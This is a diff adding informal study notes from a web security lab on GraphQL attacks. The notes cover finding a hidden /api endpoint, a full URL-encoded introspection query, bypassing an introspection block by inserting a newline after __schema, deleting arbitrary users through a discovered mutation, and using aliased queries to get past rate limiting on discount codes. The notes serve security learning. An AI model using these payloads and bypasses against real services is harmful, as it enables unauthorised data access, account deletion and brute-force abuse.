@@ -247,3 +247,64 @@ instead of `__schema{` write `__schema/n{` , try add space , keep changing until
 if it do not work , try to change the **HTTP method** that used, e..g. change it from `POST` to `GET`,
 also try to change the content type from  **`application/json`** to  **`application/www-form-urlencoded`** 
 
+### lab (finding hidden `graphql` endpoint)
+
+after get in the website you will not be  able to find `graphql` at all, so start searching
+after some search , you will see that i**f send request to `/api`** will response with 
+**`"Query not present`**
+
+it could be the hidden `graphql` , **if send `POST` request to it** , it will no accept it so the only thing **we have is `GET` request** but to make sure this is really `graphql` endpoint , we will send this 
+**`/api?query=query{__typename}`**
+from the response 
+```
+{ 
+	"data": { 
+		"__typename": "query" 
+	} 
+}
+```
+we make sure this is hidden `graphql` endpoint , now let's try introspection with this 
+
+```
+/api?query=query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A
+```
+
+it will response with `introspection is disable` change this part `__schema+%7B%0A` to this `__schema0A+%7B%0A` which it mean , changed from this `__schema{\n` to `__schema\n{\n`, that's lead to  bypass the defense
+
+it will response with `introspection` respocse save it to site map , then from site map you will find this 
+```
+mutation($input: DeleteOrganizationUserInput) {
+  deleteOrganizationUser(input: $input) {
+    user {
+      id
+      username
+    }
+```
+which will let you delete any user by only its id
+
+## Bypassing rate limiting using aliases
+
+
+#Request with aliased queries
+
+query isValidDiscount($code: Int) {
+
+isvalidDiscount(code:$code){
+
+valid
+
+}
+
+isValidDiscount2:isValidDiscount(code:$code){
+
+valid
+
+}
+
+isValidDiscount3:isValidDiscount(code:$code){
+
+valid
+
+}
+
+}
